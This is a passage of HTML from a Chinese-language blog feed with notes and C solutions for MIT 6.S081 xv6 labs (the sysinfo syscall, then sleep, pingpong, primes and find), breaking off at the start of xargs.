class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-function">uint64</span><br><span class="hljs-function"><span class="hljs-title">sys_sysinfo</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span></span><br><span class="hljs-function"></span>&#123;<br>  <span class="hljs-comment">/*int sysinfo(struct sysinfo *)</span><br><span class="hljs-comment">  struct sysinfo &#123;</span><br><span class="hljs-comment">  uint64 freemem;   // amount of free memory (bytes)</span><br><span class="hljs-comment">  uint64 nproc;     // number of process</span><br><span class="hljs-comment">  &#125;;</span><br><span class="hljs-comment">  */</span><br><br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">proc</span> *<span class="hljs-title">p</span>=</span>myproc();<br>  uint64 addr;<br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">sysinfo</span> <span class="hljs-title">res</span>;</span><span class="hljs-comment">//注意这里不可以是指针，需要声明一个sysinfo类型的结构体变量</span><br><br>  <span class="hljs-keyword">if</span>(argaddr(<span class="hljs-number">0</span>, &amp;addr) &lt; <span class="hljs-number">0</span>)<span class="hljs-comment">//addr是指向sysinfo结构体的指针</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>  <br>  res.freemem=getFreeByte();<br>  res.nproc=getProcNum();<br><br>  <span class="hljs-keyword">if</span>(copyout(p-&gt;pagetable, addr, (<span class="hljs-keyword">char</span>*)&amp;res, <span class="hljs-keyword">sizeof</span>(res))&lt;<span class="hljs-number">0</span>)<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br><br><span class="hljs-comment">/* 如果这样写会失败</span><br><span class="hljs-comment">  copyout(p-&gt;pagetable, addr, (char*)&amp;res, sizeof(res));</span><br><span class="hljs-comment">*/</span><br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>有一些头文件的添加，函数或者结构体的声明、定义的细节，暂且略过</p><p><img src="/image/image-20230305004020691.png" alt="image-20230305004020691"></p>]]></content>
    
    
    <categories>
      
      <category>MIT6S081</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>MIT-6.S081：Lab1 Xv6 and Unix utilities</title>
    <link href="/p/52c1e0f8/"/>
    <url>/p/52c1e0f8/</url>
    
    <content type="html"><![CDATA[<p>官方文档：<a href="https://pdos.csail.mit.edu/6.828/2020/labs/util.html">https://pdos.csail.mit.edu/6.828/2020/labs/util.html</a></p><h1 id="Boot-xv6"><a href="#Boot-xv6" class="headerlink" title="Boot xv6"></a>Boot xv6</h1><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> git <span class="hljs-built_in">clone</span> git <span class="hljs-built_in">clone</span> git://g.csail.mit.edu/xv6-labs-2020 <span class="hljs-comment"># 拉取仓库</span></span><br><span class="hljs-meta">$</span><span class="bash"> <span class="hljs-built_in">cd</span> xv6-labs-2020</span><br><span class="hljs-meta">$</span><span class="bash"> git checkout util <span class="hljs-comment"># 切换分支</span></span><br><span class="hljs-meta">$</span><span class="bash"> make</span> <br><span class="hljs-meta">$</span><span class="bash"> make qemu</span><br><span class="hljs-meta">$</span><span class="bash"> make grade <span class="hljs-comment"># 自动评测所有的程序</span></span><br><span class="hljs-meta">$</span><span class="bash"> ./grade-lab-util sleep <span class="hljs-comment"># 评测单个程序sleep</span></span><br></code></pre></td></tr></table></figure><h1 id="sleep"><a href="#sleep" class="headerlink" title="sleep"></a>sleep</h1><p>Implement the UNIX program <code>sleep</code> for xv6; your <code>sleep</code> should pause for a user-specified number of ticks. A tick is a notion of time defined by the xv6 kernel, namely the time between two interrupts from the timer chip. Your solution should be in the file <code>user/sleep.c</code>.</p><ul><li>在Makefile中的UPROG下面加入sleep</li><li>在user目录创建sleep.c文件</li><li>sleep.c加入的三个头文件是模仿了其他user/目录的风格</li><li>首先进行参数的检查，异常则退出</li><li>直接调用sleep()函数即可，可以在别的程序中找到这种用法</li><li>exit(0)退出程序</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&quot;kernel/types.h&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&quot;kernel/stat.h&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&quot;user/user.h&quot;</span></span><br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc,<span class="hljs-keyword">char</span> * argv[])</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">if</span>(argc != <span class="hljs-number">2</span>)&#123;<br>        <span class="hljs-built_in">fprintf</span>(<span class="hljs-number">2</span>, <span class="hljs-string">&quot;Usage: sleep [times]\n&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);<br>    &#125;<br>    sleep(atoi(argv[<span class="hljs-number">1</span>]));<br>    <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>&#125;<br></code></pre></td></tr></table></figure><blockquote><p>报错：user/sh.c:58:1: error: infinite recursion detected [-Werror=infinite-recursion]，解决办法：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// Execute cmd.  Never returns.*</span><br>__attribute__((noreturn)) <br><span class="hljs-function"><span class="hljs-keyword">void</span></span><br><span class="hljs-function"><span class="hljs-title">runcmd</span><span class="hljs-params">(struct cmd *cmd)</span> </span>&#123;<br>.....<br>&#125;<br></code></pre></td></tr></table></figure></blockquote><h1 id="pingpong"><a href="#pingpong" class="headerlink" title="pingpong"></a>pingpong</h1><p>Write a program that uses UNIX system calls to ‘’ping-pong’’ a byte between two processes over a pair of pipes, one for each direction. The parent should send a byte to the child; the child should print “<pid>: received ping”, where <pid> is its process ID, write the byte on the pipe to the parent, and exit; the parent should read the byte from the child, print “<pid>: received pong”, and exit. Your solution should be in the file <code>user/pingpong.c</code>.</p><ul><li>int fd[2]创建管道，fd[0]读、fd[1]写</li><li>管道用法：一般先创建一个管道，然后进程使用fork函数创建子进程，之后父进程关闭管道的读端，子进程关闭管道的写端</li><li>调用fork 后，父进程的 fork() 会返回子进程的 PID，子进程的fork返回 0</li><li>注意到write系统调用是<code>ssize_t write(int fd, const void *buf, size_t count);</code>，因此写入的字节是一个地址，由于我们声明buf是一个char类型，因此需要填入&amp;buf</li><li>这里踩了一个坑，把pingpong写成了pingpang导致错误</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&quot;kernel/types.h&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&quot;kernel/stat.h&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&quot;user/user.h&quot;</span></span><br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc,<span class="hljs-keyword">char</span> * argv[])</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">int</span> fd1[<span class="hljs-number">2</span>],fd2[<span class="hljs-number">2</span>];<br>    pipe(fd1);<br>    pipe(fd2);<br>    <span class="hljs-keyword">int</span> pid = fork();<br>    <br>    <span class="hljs-comment">// child</span><br>    <span class="hljs-comment">// print &quot;&lt;pid&gt;: received ping&quot;</span><br>    <span class="hljs-comment">// write back to parent a byte and exit </span><br>    <span class="hljs-comment">// close fd[1]</span><br>    <span class="hljs-comment">// zero for read and 1 for read </span><br>    <span class="hljs-keyword">if</span>(pid==<span class="hljs-number">0</span>)  <br>    &#123;<br>        close(fd1[<span class="hljs-number">1</span>]);<span class="hljs-comment">//close write </span><br>        close(fd2[<span class="hljs-number">0</span>]);<span class="hljs-comment">//close read </span><br>        <span class="hljs-keyword">char</span> buf[<span class="hljs-number">3</span>];<br>        read(fd1[<span class="hljs-number">0</span>],&amp;buf,<span class="hljs-number">1</span>);<span class="hljs-comment">//read a byte from parent</span><br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d: received ping\n&quot;</span>,getpid()); <br>        write(fd2[<span class="hljs-number">1</span>],&amp;buf,<span class="hljs-number">1</span>);<span class="hljs-comment">//write back to parent </span><br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>    &#125;<br>    <br>    <span class="hljs-comment">// parent</span><br>    <span class="hljs-comment">// send a byte to the child </span><br>    <span class="hljs-comment">// close fd[0]</span><br>    <span class="hljs-keyword">else</span> <br>    &#123;<br>        close(fd1[<span class="hljs-number">0</span>]);<span class="hljs-comment">//close read </span><br>        close(fd2[<span class="hljs-number">1</span>]);<span class="hljs-comment">//close write </span><br>        <span class="hljs-keyword">char</span> buf[<span class="hljs-number">3</span>];<br>        write(fd1[<span class="hljs-number">1</span>],<span class="hljs-string">&quot;A&quot;</span>,<span class="hljs-number">1</span>);<span class="hljs-comment">// send a byte to the child</span><br>        read(fd2[<span class="hljs-number">0</span>],&amp;buf,<span class="hljs-number">1</span>);<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d: received pong\n&quot;</span>,getpid()); <br>    &#125;<br>    <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>&#125;<br><br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/LaPhilosophie/image/img/20230208224322.png"></p><h1 id="primes"><a href="#primes" class="headerlink" title="primes"></a>primes</h1><p>Write a concurrent version of prime sieve using pipes. This idea is due to Doug McIlroy, inventor of Unix pipes. The picture halfway down <a href="http://swtch.com/~rsc/thread/">this page</a> and the surrounding text explain how to do it. Your solution should be in the file <code>user/primes.c</code>.</p><p>Your goal is to use <code>pipe</code> and <code>fork</code> to set up the pipeline. The first process feeds the numbers 2 through 35 into the pipeline. For each prime number, you will arrange to create one process that reads from its left neighbor over a pipe and writes to its right neighbor over another pipe. Since xv6 has limited number of file descriptors and processes, the first process can stop at 35.</p><ul><li>使用pipe和fork来设置管道</li><li>由于xv6文件描述符很少，所以需要关闭所有不必要的文件描述符，否则将会导致描述符耗尽</li><li>主要的素数进程应该只有在所有的输出都打印出来之后，并且在所有其他的素数进程都退出之后才能退出</li><li>关于read的用法：当管道的写端关闭时，read 返回零，这个可以控制while的终止条件</li><li>修改Makefile 的 UPROGS</li></ul><p>普通的C语言写法：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">get_primes2</span><span class="hljs-params">()</span></span>&#123;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> i=<span class="hljs-number">2</span>;i&lt;=n;i++)&#123;<br><br>        <span class="hljs-keyword">if</span>(!st[i]) primes[cnt++]=i;<span class="hljs-comment">//把素数存起来</span><br>        <span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> j=i;j&lt;=n;j+=i)&#123;<span class="hljs-comment">//不管是合数还是质数，都用来筛掉后面它的倍数</span><br>            st[j]=<span class="hljs-literal">true</span>;<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">get_primes1</span><span class="hljs-params">()</span></span>&#123;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> i=<span class="hljs-number">2</span>;i&lt;=n;i++)&#123;<br>        <span class="hljs-keyword">if</span>(!st[i])&#123;<br>            primes[cnt++]=i;<br>            <span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> j=i;j&lt;=n;j+=i) st[j]=<span class="hljs-literal">true</span>;<span class="hljs-comment">//可以用质数就把所有的合数都筛掉；</span><br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>并发编程的思路不同于以上方式，我们可以给出伪代码：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c">p = get a number from left neighbor<br>print p<br>loop:<br>    n = get a number from left neighbor<br>    <span class="hljs-keyword">if</span> (p does <span class="hljs-keyword">not</span> divide n)<br>        send n to right neighbor<br></code></pre></td></tr></table></figure><p>一个生成过程可以将数字2、3、4、 … … 35输入管道的左端: 管道中的第一个过程消除了2的倍数，第二个过程消除了3的倍数，第三个过程消除了5的倍数，依此类推</p><blockquote><p><a href="https://swtch.com/~rsc/thread/">https://swtch.com/~rsc/thread/</a></p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/LaPhilosophie/image/img/20230227125558.png"></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&quot;kernel/types.h&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&quot;kernel/stat.h&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&quot;user/user.h&quot;</span></span><br><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> READ 0</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> WRITE 1</span><br><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">foo</span><span class="hljs-params">(<span class="hljs-keyword">int</span> *left_fd)</span></span><br><span class="hljs-function"></span>&#123;<br>    close(left_fd[WRITE]);<br>    <span class="hljs-keyword">int</span> prime,i;<br>    read(left_fd[READ],&amp;prime,<span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">int</span>));<span class="hljs-comment">//第一个数字必定是素数</span><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;prime %d\n&quot;</span>,prime);<span class="hljs-comment">//符合格式的输出</span><br>    <br>    <span class="hljs-keyword">if</span>(read(left_fd[READ],&amp;i,<span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">int</span>))!=<span class="hljs-number">0</span>)<br>    &#123;<br>        <span class="hljs-keyword">int</span> right_fd[<span class="hljs-number">2</span>];<br>        pipe(right_fd);<br>        <span class="hljs-keyword">int</span> pid=fork();<br>        <span class="hljs-keyword">if</span>(pid==<span class="hljs-number">0</span>)<br>        &#123;<br>            foo(right_fd);<br>        &#125;<br>        <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(pid&gt;<span class="hljs-number">0</span>)<br>        &#123;<br>            close(right_fd[READ]);<br>            <span class="hljs-keyword">if</span>(i%prime!=<span class="hljs-number">0</span>)<span class="hljs-comment">//注意已经读取了一个i，这里要判断一下</span><br>            &#123;<br>                write(right_fd[WRITE],&amp;i,<span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">int</span>));<br>            &#125;<br>            <span class="hljs-keyword">while</span>(read(left_fd[READ],&amp;i,<span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">int</span>))!=<span class="hljs-number">0</span>)<br>            &#123;<br>                <span class="hljs-keyword">if</span>(i%prime!=<span class="hljs-number">0</span>)<br>                &#123;<br>                    write(right_fd[WRITE],&amp;i,<span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">int</span>));<br>                &#125;<br>            &#125;<br>            close(right_fd[WRITE]);<br>            close(left_fd[READ]);<br>            wait(<span class="hljs-number">0</span>);<span class="hljs-comment">//父进程要等待子进程</span><br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc,<span class="hljs-keyword">char</span> * argv[])</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">int</span> left_fd[<span class="hljs-number">2</span>];<br>    pipe(left_fd);<br>    <br>    <span class="hljs-keyword">int</span> pid = fork();<br>    <br>    <span class="hljs-keyword">if</span>(pid==<span class="hljs-number">0</span>)<span class="hljs-comment">//child</span><br>    &#123;<br>        foo(left_fd);<br>    &#125; <br>    <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(pid &gt;<span class="hljs-number">0</span>)<br>    &#123;<br>        close(left_fd[READ]);<br>        <span class="hljs-keyword">int</span> i;<br>        <span class="hljs-keyword">for</span>(i=<span class="hljs-number">2</span>;i&lt;=<span class="hljs-number">35</span>;i++)<span class="hljs-comment">//第一轮，把2~35全都传递给右边</span><br>        &#123;<br>            write(left_fd[WRITE],&amp;i,<span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">int</span>));<br>        &#125;<br>        close(left_fd[WRITE]);<br>        wait(<span class="hljs-number">0</span>);<span class="hljs-comment">//主要的素数进程应该只有在所有的输出都打印出来之后，并且在所有其他的素数进程都退出之后才能退出</span><br>    &#125;<br>    <br>    <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>&#125;<br></code></pre></td></tr></table></figure><h1 id="find"><a href="#find" class="headerlink" title="find"></a>find</h1><p>Write a simple version of the UNIX find program: find all the files in a directory tree whose name matches a string. Your solution should be in the file <code>user/find.c</code>.</p><ul><li>功能：查找目录树中名称与字符串匹配的所有文件</li><li>可以参考user/ls.c 以了解如何读取目录</li><li>避开<code>.</code>和<code>..</code>的递归</li></ul><p>思路：</p><p>打开目录，使用while循环得到目录下所有文件/子目录的dirent结构体de</p><ul><li>如果是de.name是.或者..，那么直接continue跳过</li><li>如果使用字符串拼接获取文件的相对路径buf<ul><li>如果buf的st类型是文件类型，且文件名字和我们需要搜索的文件名字相同，那么就直接输出文件信息，这就是我们要找的文件</li><li>如果buf的st类型是目录，且不为空，那么就继续递归搜索下去</li></ul></li></ul><blockquote><p>涉及到read、fstat等函数的使用</p><p>涉及到dirent、stat结构体的使用</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&quot;kernel/types.h&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&quot;kernel/stat.h&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&quot;user/user.h&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&quot;kernel/fs.h&quot;</span></span><br><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">find</span><span class="hljs-params">(<span class="hljs-keyword">char</span> * path,<span class="hljs-keyword">char</span> *file)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">int</span> fd;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">dirent</span> <span class="hljs-title">de</span>;</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">stat</span> <span class="hljs-title">st</span>;</span><br>    <span class="hljs-keyword">char</span> buf[<span class="hljs-number">512</span>], *p;<br><br>    <span class="hljs-keyword">if</span>((fd = open(path, <span class="hljs-number">0</span>)) &lt; <span class="hljs-number">0</span>)&#123;<span class="hljs-comment">//打开目录，获得对应的文件描述符</span><br>        <span class="hljs-built_in">fprintf</span>(<span class="hljs-number">2</span>, <span class="hljs-string">&quot;find: cannot open %s\n&quot;</span>, path);<br>        <span class="hljs-keyword">return</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">if</span>(fstat(fd, &amp;st) &lt; <span class="hljs-number">0</span>)&#123;<br>        <span class="hljs-built_in">fprintf</span>(<span class="hljs-number">2</span>, <span class="hljs-string">&quot;find: cannot stat %s\n&quot;</span>, path);<br>        close(fd);<br>        <span class="hljs-keyword">return</span>;<br>    &#125;<br>    <br>    <span class="hljs-keyword">while</span>(read(fd, &amp;de, <span class="hljs-keyword">sizeof</span>(de)) == <span class="hljs-keyword">sizeof</span>(de))<span class="hljs-comment">//使用while循环得到目录下所有文件/子目录的dirent结构体de</span><br>    &#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-built_in">strcmp</span>(de.name,<span class="hljs-string">&quot;.&quot;</span>)==<span class="hljs-number">0</span>||<span class="hljs-built_in">strcmp</span>(de.name,<span class="hljs-string">&quot;..&quot;</span>)==<span class="hljs-number">0</span>)<br>            <span class="hljs-keyword">continue</span>;<span class="hljs-comment">//跳过</span><br>        <br>        <span class="hljs-built_in">strcpy</span>(buf, path);<br>        p = buf+<span class="hljs-built_in">strlen</span>(buf);<br>        *p++ = <span class="hljs-string">&#x27;/&#x27;</span>;<br>        <span class="hljs-keyword">char</span> *pp=de.name;<br>        <span class="hljs-keyword">while</span>(*pp!=<span class="hljs-number">0</span>) <span class="hljs-comment">//字符串拼接</span><br>        &#123;<br>            *p++ =*pp++;<br>        &#125;<br>        *p=<span class="hljs-number">0</span>;<span class="hljs-comment">//别忘了加终止符</span><br>        <br>        <span class="hljs-keyword">if</span>(stat(buf, &amp;st) &lt; <span class="hljs-number">0</span>)<span class="hljs-comment">//获取buf的st</span><br>        &#123;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;find: cannot stat %s\n&quot;</span>, buf);<br>            <span class="hljs-keyword">continue</span>;<br>        &#125;<br>        <span class="hljs-keyword">if</span>(st.type==T_FILE)<span class="hljs-comment">//如果buf的st类型是文件类型</span><br>        &#123;<br>            <span class="hljs-keyword">if</span>(<span class="hljs-built_in">strcmp</span>(de.name,file)==<span class="hljs-number">0</span>)<span class="hljs-comment">//如果文件名字和我们需要搜索的文件名字相同，那么就直接输出文件信息</span><br>            &#123;<br>                <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%s\n&quot;</span>,buf);<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(st.type==T_DIR)<span class="hljs-comment">//如果buf的st类型是目录类型</span><br>        &#123;<br>            <span class="hljs-keyword">if</span> (de.inum == <span class="hljs-number">0</span>) <span class="hljs-comment">//目录下没有文件，如果缺少这个语句xargs命令将会报错</span><br>    <span class="hljs-keyword">continue</span>;<br>            find(buf,file);<span class="hljs-comment">//递归，继续搜索</span><br>        &#125;<br><br>    &#125;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc, <span class="hljs-keyword">char</span> *argv[])</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">char</span> * path=argv[<span class="hljs-number">1</span>];<span class="hljs-comment">//查找目录</span><br>    <span class="hljs-keyword">char</span> * file=argv[<span class="hljs-number">2</span>];<span class="hljs-comment">//查找文件</span><br><br>    find(path,file);<br><br>    <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>&#125;<br></code></pre></td></tr></table></figure><h1 id="xargs"><a href="#xargs" class="headerlink" title="xargs"></a>xargs</h1><p>Write a simple version of the UNIX xargs program: read lines from the standard input and run a command for each line, supplying the line as arguments to the command. Your solution should be in the file <code>user/xargs.c</code>.</p><ul><li>对于管道连接的命令，以<code>find . b | xargs grep hello</code>为例，argv[0]是 xargs，argv[1]是grep，一共有三个参数，如果想要读取find . b，那么需要从标准输入中读取，也即是使用read函数读取fd为0时的数据</li><li>每一次读取一行，将该行所有空格替换为\0，这样命令就可以被分割。然后将argv[]指向这些命令。如果遇到换行符，执行fork，父进程等待子进程结束</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span 